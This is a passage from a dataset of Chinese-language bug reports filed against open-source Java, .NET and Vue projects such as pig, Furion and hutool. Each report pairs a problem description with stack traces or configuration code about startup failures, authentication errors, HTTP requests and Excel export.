运行pig-eureka报错，未改动任何源码和配置,"pig版本: 2.3.2 操作系统: Windows7 是否修改包名: 否 直接下载pig源码运行pig-eureka，报以上提供的错误日志，请问是什么问题导致的呢，谢谢。   <code>: 2019-08-15 20:06:56.158 INFO [pig-eureka,,,] 17140 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration' of type [org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration$$EnhancerBySpringCGLIB$$44ec046c] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2019-08-15 20:06:56.172 INFO [pig-eureka,,,] 17140 --- [ main] c.u.j.filter.DefaultLazyPropertyFilter : Property Filter custom Bean not found with name 'encryptablePropertyFilter'. Initializing Default Property Filter 2019-08-15 20:06:56.180 WARN [pig-eureka,,,] 17140 --- [ main] s.c.a.AnnotationConfigApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'textEncryptor' defined in class path resource [org/springframework/cloud/bootstrap/encrypt/EncryptionBootstrapConfiguration$RsaEncryptionConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.security.crypto.encrypt.TextEncryptor]: Factory method 'textEncryptor' threw exception; nested exception is java.lang.NullPointerException 2019-08-15 20:06:56.184 INFO [pig-eureka,,,] 17140 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2019-08-15 20:06:56.191 ERROR [pig-eureka,,,] 17140 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'textEncryptor' defined in class path resource [org/springframework/cloud/bootstrap/encrypt/EncryptionBootstrapConfiguration$RsaEncryptionConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.security.crypto.encrypt.TextEncryptor]: Factory method 'textEncryptor' threw exception; nested exception is java.lang.NullPointerException at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:627) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:456) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1321) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:845) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:877) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:549) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:743) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:390) at org.springframework.boot.SpringApplication.run(SpringApplication.java:312) at org.springframework.boot.builder.SpringApplicationBuilder.run(SpringApplicationBuilder.java:140) at org.springframework.cloud.bootstrap.BootstrapApplicationListener.bootstrapServiceContext(BootstrapApplicationListener.java:203) at org.springframework.cloud.bootstrap.BootstrapApplicationListener.onApplicationEvent(BootstrapApplicationListener.java:114) at org.springframework.cloud.bootstrap.BootstrapApplicationListener.onApplicationEvent(BootstrapApplicationListener.java:71) at org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172) at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165) at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139) at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:127) at org.springframework.boot.context.event.EventPublishingRunListener.environmentPrepared(EventPublishingRunListener.java:76) at org.springframework.boot.SpringApplicationRunListeners.environmentPrepared(SpringApplicationRunListeners.java:53) at org.springframework.boot.SpringApplication.prepareEnvironment(SpringApplication.java:341) at org.springframework.boot.SpringApplication.run(SpringApplication.java:305) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1214) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1203) at com.pig4cloud.pig.eureka.PigEurekaApplication.main(PigEurekaApplication.java:34) Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.security.crypto.encrypt.TextEncryptor]: Factory method 'textEncryptor' threw exception; nested exception is java.lang.NullPointerException at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:622) ... 30 common frames omitted Caused by: java.lang.NullPointerException: null at org.springframework.cloud.context.encrypt.EncryptorFactory.create(EncryptorFactory.java:55) at org.springframework.cloud.bootstrap.encrypt.EncryptionBootstrapConfiguration$RsaEncryptionConfiguration.textEncryptor(EncryptionBootstrapConfiguration.java:95) at org.springframework.cloud.bootstrap.encrypt.EncryptionBootstrapConfiguration$RsaEncryptionConfiguration$$EnhancerBySpringCGLIB$$d6a85d57.CGLIB$textEncryptor$0(&lt;generated&gt;) at org.springframework.cloud.bootstrap.encrypt.EncryptionBootstrapConfiguration$RsaEncryptionConfiguration$$EnhancerBySpringCGLIB$$d6a85d57$$FastClassBySpringCGLIB$$bd85f670.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:244) at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:363) at org.springframework.cloud.bootstrap.encrypt.EncryptionBootstrapConfiguration$RsaEncryptionConfiguration$$EnhancerBySpringCGLIB$$d6a85d57.textEncryptor(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ... 31 common frames omitted 2019-08-15 20:06:56.197 ERROR [pig-eureka,,,] 17140 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'textEncryptor' defined in class path resource [org/springframework/cloud/bootstrap/encrypt/EncryptionBootstrapConfiguration$RsaEncryptionConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.security.crypto.encrypt.TextEncryptor]: Factory method 'textEncryptor' threw exception; nested exception is java.lang.NullPointerException at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:627) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:456) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1321) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:845) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:877) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:549) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:743) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:390) at org.springframework.boot.SpringApplication.run(SpringApplication.java:312) at org.springframework.boot.builder.SpringApplicationBuilder.run(SpringApplicationBuilder.java:140) at org.springframework.cloud.bootstrap.BootstrapApplicationListener.bootstrapServiceContext(BootstrapApplicationListener.java:203) at org.springframework.cloud.bootstrap.BootstrapApplicationListener.onApplicationEvent(BootstrapApplicationListener.java:114) at org.springframework.cloud.bootstrap.BootstrapApplicationListener.onApplicationEvent(BootstrapApplicationListener.java:71) at org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172) at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165) at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139) at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:127) at org.springframework.boot.context.event.EventPublishingRunListener.environmentPrepared(EventPublishingRunListener.java:76) at org.springframework.boot.SpringApplicationRunListeners.environmentPrepared(SpringApplicationRunListeners.java:53) at org.springframework.boot.SpringApplication.prepareEnvironment(SpringApplication.java:341) at org.springframework.boot.SpringApplication.run(SpringApplication.java:305) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1214) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1203) at com.pig4cloud.pig.eureka.PigEurekaApplication.main(PigEurekaApplication.java:34) Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.security.crypto.encrypt.TextEncryptor]: Factory method 'textEncryptor' threw exception; nested exception is java.lang.NullPointerException at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:622) ... 30 common frames omitted Caused by: java.lang.NullPointerException: null at org.springframework.cloud.context.encrypt.EncryptorFactory.create(EncryptorFactory.java:55) at org.springframework.cloud.bootstrap.encrypt.EncryptionBootstrapConfiguration$RsaEncryptionConfiguration.textEncryptor(EncryptionBootstrapConfiguration.java:95) at org.springframework.cloud.bootstrap.encrypt.EncryptionBootstrapConfiguration$RsaEncryptionConfiguration$$EnhancerBySpringCGLIB$$d6a85d57.CGLIB$textEncryptor$0(&lt;generated&gt;) at org.springframework.cloud.bootstrap.encrypt.EncryptionBootstrapConfiguration$RsaEncryptionConfiguration$$EnhancerBySpringCGLIB$$d6a85d57$$FastClassBySpringCGLIB$$bd85f670.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:244) at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:363) at org.springframework.cloud.bootstrap.encrypt.EncryptionBootstrapConfiguration$RsaEncryptionConfiguration$$EnhancerBySpringCGLIB$$d6a85d57.textEncryptor(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154)"
This instance has already started one or more requests. Properties can only be modified before sending the first request.,"Furion 版本号 4.5.1 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 发生了什么？ 第一次http请求成功 第二次报错 This instance has already started one or more requests. Properties can only be modified before sending the first request. 之前的代码可以的 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则将无法得到答复。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: System.InvalidOperationException: This instance has already started one or more requests. Properties can only be modified before sending the first request. at System.Net.Http.HttpClient.CheckDisposedOrStarted() at System.Net.Http.HttpClient.set_Timeout(TimeSpan value) at Furion.RemoteRequest.HttpRequestPart.SendAsync(CancellationToken cancellationToken) at Furion.RemoteRequest.HttpRequestPart.SendAsStringAsync(CancellationToken cancellationToken) at HttpClient.Application.SystemAppService.GetDescription() in C:\Users\Administrator\Desktop\HttpClient\HttpClient\HttpClient.Application\System\SystemAppService.cs:line 25 at lambda_method15(Closure , Object ) at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.AwaitableObjectResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.&lt;InvokeActionMethodAsync&gt;g__Logged|12_1(ControllerActionInvoker invoker) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.&lt;InvokeNextActionFilterAsync&gt;g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.&lt;InvokeInnerFilterAsync&gt;g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.&lt;InvokeNextExceptionFilterAsync&gt;g__Awaited|26_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)"
Feign 调用 401 Full authentication is required to access this resource ,"pig版本:3.1.0 配置自定义资源服务器，通过 资源服务器内部访问直接访问 controller 接口是正常的， 然后使用 feign,调用的时候就401，未授权。 feign 接口 feign_Client controller接口 资源服务器配置 错误是 org.springframework.security.web.access.ExceptionTranslationFilter 下的handleAuthenticationException方法发出的、 然后发现是 AccessDeniedException 调用。 调用这个 类的是 doFilter方法， 最后发现是 ResourceServerSecurityConfigurer 会注册一个 OAuth2WebSecurityExpressionHandler 它会 处理 资源服务器配置的表达式 new OAuth2SecurityExpressionMethods(authentication),需要传入 授权对象 Authentication authentication ，但是 这个 授权对象一直没有获取到 也就是说根本没有拷贝token到下游服务是吗，或者是token换取授权信息丢失了。？？   <code>: @FeignClient(contextId = ""remoteDictService"", value = ServiceNameConstants.DICT_SERVICE, fallbackFactory = RemoteDictServiceFallbackFactory.class) public interface RemoteDictService { /** * 查询所有字典信息 * * @param from * @return 字典信息 */ @GetMapping(""/dict/list"") R&lt;List&lt;DictWbs&gt;&gt; list(@RequestHeader(SecurityConstants.FROM) String from); @RestController @RequiredArgsConstructor @RequestMapping(""/dev-api"") public class VueRetController { private final RemoteDictService remoteDictService; /** * 获取WBS字典列表 * @return */ @GetMapping(""dict"") public List&lt;DictWbs&gt; dict(){ R&lt;List&lt;DictWbs&gt;&gt; result = remoteDictService.list(SecurityConstants.FROM_IN); return result.getData(); } } @RestController @RequiredArgsConstructor @RequestMapping(""/dict"") @Api(value = ""dict"", tags = ""字典管理模块"") public class DictController { private final DictWbsService dictService; /** * 查询字典信息 * @return 字典信息 */ @GetMapping(""/list"") public R list() { return R.ok(dictService.list()); } @Configuration //@EnableResourceServer public class ResourceServerConfig extends ResourceServerConfigurerAdapter { @Bean public TokenStore tokenStore(){ return new JwtTokenStore(jwtAccessTokenConverter()); } /** * JWT令牌校验工具 * @return */ @Bean public JwtAccessTokenConverter jwtAccessTokenConverter(){ JwtAccessTokenConverter jwtAccessTokenConverter = new JwtAccessTokenConverter(); //设置JWT签名密钥。它可以是简单的MAC密钥，也可以是RSA密钥 jwtAccessTokenConverter.setSigningKey(""http://localhost:3000/public/jwks""); return jwtAccessTokenConverter; } //资源服务令牌验证服务,通过远程校验令牌(yml) // @Bean // public ResourceServerTokenServices resourceServerTokenServices(){ // //使用远程服务请求授权服务器校验token ， 即：资源服务和授权服务器不在一个主机 // RemoteTokenServices services = new RemoteTokenServices(); // //授权服务地址 , 当浏览器访问某个资源时就会调用该远程授权服务地址去校验token // //要求请求中必须携带token // services.setCheckTokenEndpointUrl(""http://localhost:3000/oauth/check_token""); // //客户端id，对应认证服务的客户端详情配置oauth_client_details表中的clientId // services.setClientId(""webapp""); // //密钥，对应认证服务的客户端详情配置的秘钥 // services.setClientSecret(""secret""); // return services; // } @Override public void configure(ResourceServerSecurityConfigurer resources) { //资源ID，请求中的Token必须有用该资源ID的访问权限才可以访问该资源服务器 resources.resourceId(SecurityConstants.RESOURCE_ID); //指定TokenStore，使用JWT校验 resources.tokenStore(tokenStore()); //无状态 resources.stateless(true); //验证令牌的服务，令牌验证通过才允许获取资源，使用远程校验 // resources.tokenServices(resourceServerTokenServices()); } @Override public void configure(HttpSecurity http) throws Exception { http // Since we want the protected resources to be accessible in the UI as well we need // session creation to be allowed (it's disabled by default in 2.0.6) .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED) .and() .requestMatchers().antMatchers(""/dict/**"") .and() .authorizeRequests() .antMatchers(""/dict/**"") // .access(""#oauth2.hasScope('openid') or #oauth2.hasScope('read') and hasRole('ROLE_USER')""); .access(""#oauth2.throwOnError(#oauth2.hasScope('openid') and hasRole('ROLE_1'))""); } //TODO 注入 此RemoteTokenServices // @see https://gitee.com/log4j/pig/issues/I3P0L8 @Primary @Bean public RemoteTokenServices tokenServices() { final RemoteTokenServices tokenService = new RemoteTokenServices(); tokenService.setCheckTokenEndpointUrl(""http://pig-auth:3000/oauth/check_token""); tokenService.setClientId(""pig""); tokenService.setClientSecret(""pig""); return tokenService; } private void handleAuthenticationException(HttpServletRequest request, HttpServletResponse response, FilterChain chain, AuthenticationException exception) throws ServletException, IOException { this.logger.trace(""Sending to authentication entry point since authentication failed"", exception); sendStartAuthentication(request, response, chain, exception); } private void handleAccessDeniedException(HttpServletRequest request, HttpServletResponse response, FilterChain chain, AccessDeniedException exception) throws ServletException, IOException { Authentication authentication = SecurityContextHolder.getContext().getAuthentication(); boolean isAnonymous = this.authenticationTrustResolver.isAnonymous(authentication); if (isAnonymous || this.authenticationTrustResolver.isRememberMe(authentication)) { if (logger.isTraceEnabled()) { logger.trace(LogMessage.format(""Sending %s to authentication entry point since access is denied"", authentication), exception); } sendStartAuthentication(request, response, chain, new InsufficientAuthenticationException( this.messages.getMessage(""ExceptionTranslationFilter.insufficientAuthentication"", ""Full authentication is required to access this resource""))); } private void handleSpringSecurityException(HttpServletRequest request, HttpServletResponse response, FilterChain chain, RuntimeException exception) throws IOException, ServletException { if (exception instanceof AuthenticationException) { handleAuthenticationException(request, response, chain, (AuthenticationException) exception); } else if (exception instanceof AccessDeniedException) { handleAccessDeniedException(request, response, chain, (AccessDeniedException) exception); } } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { doFilter((HttpServletRequest) request, (HttpServletResponse) response, chain); } private SecurityExpressionHandler&lt;FilterInvocation&gt; expressionHandler = new OAuth2WebSecurityExpressionHandler(); @Override protected StandardEvaluationContext createEvaluationContextInternal(Authentication authentication, FilterInvocation invocation) { StandardEvaluationContext ec = super.createEvaluationContextInternal(authentication, invocation); ec.setVariable(""oauth2"", new OAuth2SecurityExpressionMethods(authentication)); return ec; }"
引入富文本编辑器表单加载出错,"插件版本 avue-plugin-ueditor 0.2.3 wangeditor 4.7.5 form表单引入富文本编辑器报错   <code>: { type: 'ueditor', component: 'avue-ueditor', label: '文章内容', span: 24, display: true, customConfig: {}, // wangEditor编辑的配置 action: `${this.$baseUrl}system/upload`, oss: 'ali', props: {}, ali: { region: 'cn-bjing', endpoint: 'oss-jing.aliyuncs.com', accessKeyId: 'LTAI5tZ', accessKeySecret: '', bucket: 'ow3' }, prop: 'content', required: true, rules: [ { required: true, message: '富文本必须填写' } ] } [Vue warn]: $attrs is readonly. found in ---&gt; &lt;AvueUeditor&gt; at node_modules/avue-plugin-ueditor/packages/ueditor/src/main.vue &lt;FormTemp&gt; &lt;ElFormItem&gt; at packages/form/src/form-item.vue &lt;ElCol&gt; &lt;ElCollapseItem&gt; at packages/collapse/src/collapse-item.vue &lt;ElCollapse&gt; at packages/collapse/src/collapse.vue &lt;AvueGroup&gt; &lt;ElRow&gt; &lt;ElForm&gt; at packages/form/src/form.vue &lt;AvueForm&gt; &lt;ElDrawer&gt; at packages/drawer/src/main.vue &lt;ArticleList&gt; at src/views/manage/article/index.vue &lt;ElContainer&gt; at packages/container/src/main.vue &lt;Layout&gt; at src/layout/index.vue &lt;App&gt; at src/App.vue &lt;Root&gt;"
dataset: remove feed mode in comment,: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : There exist key words in datasets.py Current we name as No such key words   <code>: feed mode feed mode dataset_sink_mode is false feed mode
Excel导出无法导出重复表头列希望增加Excel可以导出重复表头,"JDK版本： openjdk_8_201 hutool版本： 5.6.3 Excel导出无法导出重复表头列   <code>: public ExcelWriter writeHeadRow(Iterable&lt;?&gt; rowData) { Assert.isFalse(this.isClosed, ""ExcelWriter has been closed!"", new Object[0]); this.headLocationCache = new ConcurrentHashMap(); Row row = this.sheet.createRow(this.currentRow.getAndIncrement()); int i = 0; for(Iterator var5 = rowData.iterator(); var5.hasNext(); ++i) { Object value = var5.next(); Cell cell = row.createCell(i); CellUtil.setCellValue(cell, value, this.styleSet, true); this.headLocationCache.put(StrUtil.toString(value), i); } return this; } public ExcelWriter writeRow(Map&lt;?, ?&gt; rowMap, boolean isWriteKeyAsHead) { Assert.isFalse(this.isClosed, ""ExcelWriter has been closed!"", new Object[0]); if (MapUtil.isEmpty(rowMap)) { return this.passCurrentRow(); } else { Map&lt;?, ?&gt; aliasMap = this.aliasMap(rowMap); if (isWriteKeyAsHead) { this.writeHeadRow(aliasMap.keySet()); } if (MapUtil.isNotEmpty(this.headLocationCache)) { Row row = RowUtil.getOrCreateRow(this.sheet, this.currentRow.getAndIncrement()); Iterator var6 = aliasMap.entrySet().iterator(); while(var6.hasNext()) { Entry&lt;?, ?&gt; entry = (Entry)var6.next(); Integer location = (Integer)this.headLocationCache.get(StrUtil.toString(entry.getKey())); if (null != location) { CellUtil.setCellValue(CellUtil.getOrCreateCell(row, location), entry.getValue(), this.styleSet, false); } } } else { this.writeRow(aliasMap.values()); } return this; } } private Map&lt;?, ?&gt; aliasMap(Map&lt;?, ?&gt; rowMap) { if (MapUtil.isEmpty(this.headerAlias)) { return rowMap; } else { Map&lt;Object, Object&gt; filteredMap = MapUtil.newHashMap(rowMap.size(), true); Iterator var4 = rowMap.entrySet().iterator(); while(var4.hasNext()) { Entry&lt;?, ?&gt; entry = (Entry)var4.next(); String aliasName = (String)this.headerAlias.get(StrUtil.toString(entry.getKey())); if (null != aliasName) { filteredMap.put(aliasName, entry.getValue()); } else if (!this.onlyAlias) { filteredMap.put(entry.getKey(), entry.getValue()); } } return filteredMap; } }"
TOC端用户创建完成后，他就拥有管理员的所有访问权限，有什么思路限制他的权限,"我在这边定义了authorities，为什么不起作用呢，该用什么方法给TOC端用户赋予权限 这是凑个字数，详细在截图中 // 登录流程使用 @加贝 @SneakyThrows public UserDetails loadUserByUsername(String username) { return new BaiyunUser(user.getId(), user.getUsername(), 1L, ""Phone"", ""Avatar"", user.getNickname(), ""Name"", ""Email"", 1L, ""{noop}"" + user.getPassword(), true, true, true, true,authorities ); } 环境信息 pigx版本4.4.0 是否修改包名: 是 提供详细   <code>: TocCustom user = remoteUserService.custom(username, SecurityConstants.FROM_IN).getData(); Set&lt;String&gt; dbAuthsSet = new HashSet&lt;&gt;(); List&lt;String&gt;list = new ArrayList&lt;&gt;(); list.add(""/admin/user/index""); list.add(""sys_user_add""); list.add(""sys_user_edit""); list.add(""sys_user_del""); dbAuthsSet.addAll(list); Collection&lt;? extends GrantedAuthority&gt; authorities = AuthorityUtils .createAuthorityList(dbAuthsSet.toArray(new String[0]));"
修改默认sentinel nacos日志位置,pig版本: 3.4.0 是否修改包名: 否 本地启动微服务 会在C:\Users\liuxiao\logs\csp目录下产生日志 现在想改变此目录位置   <code>: 微服务依赖sentinel &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt;
POST请求参数丢失问题,"JDK版本： jdk_8 hutool版本： 5.7.20或5.7.19 参数接收方为： 基于项目原因，参数需要用下划线方式来接收。 2. 无堆栈信息。 问题具体为： 接收方无法接收到event_time参数。 当把版本降低为5.7.0时，可正常接收。 3.   <code>: String pushUrl = ""XXXX""; Map&lt;String, Object&gt; param = new HashMap&lt;&gt;(12); param.put(""code_all"", ""999-001-002-311""); param.put(""event_remark"", StrUtil.format(""cpu占用达到{}%，请尽快处理"", ""30%"")); param.put(""event_time"", ""2022-01-26 00:00:00""); String re = HttpUtil.post(pushUrl, param); return; private LocalDateTime event_time;"
无法启动gateway,"异常日志 (注意使用MD语法 使用``格式化日志，越详细越好) 10-10 09:15:20.117 INFO [o.s.c.a.AnnotationConfigApplicationContext] - Refreshing org.springframework.context.annotation.AnnotationConfigApplicationContext@e25951c: startup date [Wed Oct 10 09:15:20 CST 2018]; root of context hierarchy 10-10 09:15:20.233 INFO [org.hibernate.validator.internal.util.Version] - HV000001: Hibernate Validator 5.4.1.Final 10-10 09:15:20.504 INFO [c.u.j.c.EnableEncryptablePropertiesBeanFactoryPostProcessor] - Post-processing PropertySource instances 10-10 09:15:20.602 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource bootstrap [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:20.603 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource servletConfigInitParams [org.springframework.core.env.PropertySource$StubPropertySource] to EncryptablePropertySourceWrapper 10-10 09:15:20.604 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource servletContextInitParams [org.springframework.core.env.PropertySource$StubPropertySource] to EncryptablePropertySourceWrapper 10-10 09:15:20.604 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource systemProperties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:20.604 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource systemEnvironment [org.springframework.core.env.SystemEnvironmentPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:20.604 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource random [org.springframework.boot.context.config.RandomValuePropertySource] to EncryptablePropertySourceWrapper 10-10 09:15:20.604 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource applicationConfig: [classpath:/bootstrap.yml]#dev [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:20.604 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource applicationConfig: [classpath:/bootstrap.yml] [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:20.605 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource springCloudClientHostInfo [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:20.605 INFO [c.u.j.EncryptablePropertySourceConverter] - Converting PropertySource defaultProperties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 10-10 09:15:20.611 INFO [o.s.b.f.a.AutowiredAnnotationBeanPostProcessor] - JSR-330 'javax.inject.Inject' annotation found and supported for autowiring 10-10 09:15:20.678 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'org.springframework.retry.annotation.RetryConfiguration' of type [org.springframework.retry.annotation.RetryConfiguration$$EnhancerBySpringCGLIB$$918afe4c] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:20.692 INFO [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'configurationPropertiesRebinderAutoConfiguration' of type [org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration$$EnhancerBySpringCGLIB$$b7e16924] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 10-10 09:15:20.737 INFO [c.u.j.resolver.DefaultLazyPropertyResolver] - Property Resolver custom Bean not found with name 'encryptablePropertyResolver'. Initializing Default Property Resolver 10-10 09:15:20.739 INFO [c.u.j.detector.DefaultLazyPropertyDetector] - Property Detector custom Bean not found with name 'encryptablePropertyDetector'. Initializing Default Property 